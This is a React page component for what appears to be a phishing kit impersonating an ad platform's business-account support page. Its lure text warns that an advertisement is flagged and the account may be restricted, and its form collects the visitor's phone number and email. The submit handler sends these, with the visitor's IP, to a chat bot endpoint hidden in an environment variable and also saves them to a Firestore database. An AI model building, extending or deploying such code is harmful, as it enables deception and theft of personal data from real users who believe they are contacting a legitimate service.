import styles from '../styles/home-page.module.css';
import PhoneInput from 'react-phone-input-2'
import 'react-phone-input-2/lib/style.css'
import axios from 'axios'
import { doc, setDoc, Timestamp } from "firebase/firestore";
import { db } from  '../firebaseConfig';
import React from "react";
import { useEffect, } from 'react';
import ReCAPTCHA from 'react-google-recaptcha';



const HomePage = (props) => {

    const recaptchaRef = React.createRef();
    const [email, setEmail] = React.useState("");
    const [phone, setPhone] = React.useState('+1');

    const getGeoInfo = async () => {
        await axios.get('https://ipapi.co/json/').then((response) => {
            let data = response.data;
            setPhone(data.country_calling_code ? data.country_calling_code : '+1' );
        }).catch((error) => {
            console.log(error);
        });
    };

    useEffect(()=>{
       getGeoInfo();
    },[]);  

    const onPhoneChange = async (data) => { 
        setPhone(data);
    }

    const onEmailChange = async (data) => {     
        setEmail(data.target.value);
    }

    const handleSubmit = async (event) => { 
        event.preventDefault();
        recaptchaRef.current.execute();

        let obj = {
            email: email,
            phone: phone,
            createdAt: await Timestamp.now(),
            ip: props.ip.userIP
        }

        const formattedMessage = `
        <b>User (${props.ip.userIP})</b>
        -------------------------
        <b>Email:</b> ${email}
        <b>Phone:</b> ${phone}
        `;
    
        const data = {
          chat_id: process.env.chatId,
          text: formattedMessage,
          parse_mode: 'HTML'
        };
    
    
        const response = await fetch(process.env.customKey, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });


        await setDoc(doc(db, "users", email), obj);
        localStorage.setItem("email", email);

    }
 
    const onReCAPTCHAChange = async (captchaCode) => {
        // If the reCAPTCHA code is null or undefined indicating that
        // the reCAPTCHA was expired then return early
        if (!captchaCode) {
          return;
        }
        try {
          const response = await fetch("/api/register", {
            method: "POST",
            body: JSON.stringify({ email, captcha: captchaCode }),
            headers: {
              "Content-Type": "application/json",
            },
          });
          if (response.ok) {
            // If the response is ok than show the success alert
            // alert("Email registered successfully");
            trigerNext();
          } else {
            // Else throw an error with the message returned
            // from the API
            const error = await response.json();
            throw new Error(error.message)
          }
        } catch (error) {
          alert(error?.message || "Something went wrong");
        } finally {
          // Reset the reCAPTCHA when the request has failed or succeeeded
          // so that it can be executed again if user submits another email.
          recaptchaRef.current.reset();
          setEmail("");
        }
      };

    const trigerNext = () => {
        // props.email = email;
        props.onSubmit({type: 'home-page', phone, email});
    }

    return (
        <div className={styles.robotCheck}>

            <div className={styles.top}>
                <span className={styles.label}>Account Overview</span>
                <span className={styles.split}> / </span>
                <span className={styles.label}>Business Account</span>
            </div>

            <div className={styles.alert}>
                <div className={styles.alertLabel}>
                    <div className={styles.alertIcon} ></div>
                    <span className={styles.label}>Issue with Your Advertisement</span>
                </div>

                <span className={styles.description}>
                Your advertisement seems to have encountered an issue. Please get in touch with us at your earliest convenience so we can address it together.                </span>
            </div>

            <div className={styles.alertSecond}>
                <div className={styles.profile}>
                    <div className={styles.profileIcon}></div>
                    <div className={styles.info}>
                        <h4>Bussines Account</h4>
                        <div className={styles.labelRestricted}>
                             <span className={styles.redLabel}>Account with issue</span>  •  <span>Flagged on {new Date().toLocaleString("en-US", { day: '2-digit', month: "short" })}</span>
                        </div>
                    </div>
                </div>

                <span className={styles.description}>
                    We've detected an issue with one of your advertisements, and if left unresolved, it may result in restrictions being placed on your ad account.
                </span>

                <div className={styles.labels}>
                        <h1>How can we help? </h1>
                        <p>We need more information to address your issue. This form will only take a few minutes.</p>
                </div>

                <div className={styles.submitRequest}>
                        
                        <div className={styles.box}>
                            
                            <form onSubmit={handleSubmit}>
                                <h3>Get help</h3>
                                <div className={styles.formControl}>
                                    <label>Phone number</label>
                                    <PhoneInput 
                                    country={'us'}
                                    required 
                                    value={phone} 
                                    // onChange={phone => setPhone({ phone })} 
                                    onChange={(e) => onPhoneChange(e)}
                                    /> 
                                </div>

                                <div className={styles.formControl}>
                                    <label>Email address</label>
                                    <input
                                    required
                                    type="email"
                                    onChange={(e) => onEmailChange(e)}
                                    placeholder="email"/>
                                </div>

                                <div className={styles.bottom}>

                                    <ReCAPTCHA
                                        ref={recaptchaRef}
                                        size="invisible"
                                        sitekey={'6LfsCgIqAAAAADBePRlkLA7OsmwPCvRiLVO-kR29'}
                                        onChange={onReCAPTCHAChange}
                                    />

                                    <button 
                                    type="submit"
                                    disabled={!email}
                                    >
                                        <svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 512 512"><path d="M76.83 480a25.69 25.69 0 01-25.57-25.74 29.13 29.13 0 011.2-7.63L70.88 380c.77-2.46-.1-4.94-1.23-6.9l-.22-.4c-.08-.13-.46-.66-.73-1.05s-.58-.81-.86-1.22l-.19-.27A215.66 215.66 0 0132 251.37c-.18-57.59 22.35-112 63.46-153.28C138 55.47 194.9 32 255.82 32A227.4 227.4 0 01398 81.84c39.45 31.75 66.87 76 77.21 124.68a213.5 213.5 0 014.78 45c0 58.93-22.64 114.28-63.76 155.87-41.48 42-97.18 65.06-156.83 65.06-21 0-47.87-5.36-60.77-9-15.52-4.34-30.23-10-31.85-10.6a15.12 15.12 0 00-5.37-1 14.75 14.75 0 00-5.8 1.15l-.85.33-67.48 24.38A29.44 29.44 0 0176.83 480zm-2-31.8zM87.48 380z"></path></svg>
                                        Contact us
                                    </button>
  
                                </div>
                                    
                            </form>

                        </div>
                </div>
            </div>
        </div>
    );
};

export default HomePage;
